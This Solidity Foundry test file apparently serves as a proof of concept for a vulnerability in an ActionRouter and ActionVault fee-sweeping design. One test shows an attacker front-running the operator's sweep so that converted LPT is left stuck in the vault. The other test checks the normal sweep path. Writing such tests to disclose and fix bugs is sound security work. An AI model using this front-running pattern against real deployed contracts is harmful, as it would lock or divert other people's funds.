// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {ActionRouter} from "../src/ActionRouter.sol";
import {ActionVault} from "../src/ActionVault.sol";
import {MockERC20} from "../src/Mocks/MockERC20.sol";
import {LendingProtocol} from "../src/LendingProtocol.sol";
import {LPT} from "../src/LPT.sol";

contract RouterTest is Test {
    ActionRouter public router;
    ActionVault public actionVault;
    LendingProtocol public lending;
    LPT public lpt;

    MockERC20 public usdc;
    MockERC20 public dai;

    address public operator = makeAddr("operator");
    address public alice = makeAddr("alice");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        lpt = new LPT();
        usdc = new MockERC20("Mock USDC", "USDC", 18);
        dai = new MockERC20("Mock DAI", "DAI", 18);

        lending = new LendingProtocol();
        router = new ActionRouter(address(lpt), address(lending));
        actionVault = new ActionVault(address(lpt), address(router), operator);
        router.setActionVault(address(actionVault));

        router.whitelistToken(address(usdc), 2e18); // 1:2
        router.whitelistToken(address(dai), 1e18); // 1:1

        // Give Alice some currencies
        usdc.mint(alice, 10_000 ether);
        dai.mint(alice, 20_000 ether);

        // We fund the router with LPT so it can do the fake swaps
        lpt.transfer(address(router), 1_000_000 ether);
    }

    function test_FrontRunAndBrickTreasuryFunds() public {
        address[] memory tokens = new address[](2);
        tokens[0] = address(usdc);
        tokens[1] = address(dai);

        //User supplies both currencies
        vm.startPrank(alice);

        usdc.approve(address(lending), 10_000 ether);
        lending.supply(address(usdc), 10_000 ether);

        dai.approve(address(lending), 20_000 ether);
        lending.supply(address(dai), 20_000 ether);

        vm.stopPrank();

        assertEq(lending.accruedFees(address(usdc)), 100 ether);
        assertEq(lending.accruedFees(address(dai)), 200 ether);

        // Attacker front-runs it
        vm.prank(attacker);
        router.sweepFees(tokens);

        // LPT sent to ActionVault
        assertEq(lpt.balanceOf(address(attacker)), 0);
        assertEq(lpt.balanceOf(address(actionVault)), 400 ether); // 100*2 USDC + 1*200 DAI = 400
        assertEq(lending.accruedFees(address(usdc)), 0);
        assertEq(lending.accruedFees(address(dai)), 0);

        // Operator tries to sweep
        vm.prank(operator);
        uint256 net = actionVault.sweepFeesAndTransfer(tokens);

        // No LPT arrived during operator's call
        assertEq(net, 0);

        // Operator gets nothing
        assertEq(lpt.balanceOf(address(operator)), 0);

        // Funds are stuck in ActionVault
        assertEq(lpt.balanceOf(address(actionVault)), 400 ether);
    }

    function test_NormalSweepWorks() public {
        address[] memory tokens = new address[](2);
        tokens[0] = address(usdc);
        tokens[1] = address(dai);

        // Alice supplies USDC
        vm.startPrank(alice);
        usdc.approve(address(lending), 10_000 ether);
        lending.supply(address(usdc), 10_000 ether);

        // Alice supplies DAI
        dai.approve(address(lending), 20_000 ether);
        lending.supply(address(dai), 20_000 ether);

        vm.stopPrank();

        // Operator sweeps
        vm.prank(operator);
        uint256 net = actionVault.sweepFeesAndTransfer(tokens);

        assertEq(net, 400 ether);
        assertEq(lpt.balanceOf(address(operator)), 400 ether);
        assertEq(lpt.balanceOf(address(actionVault)), 0);
    }
}
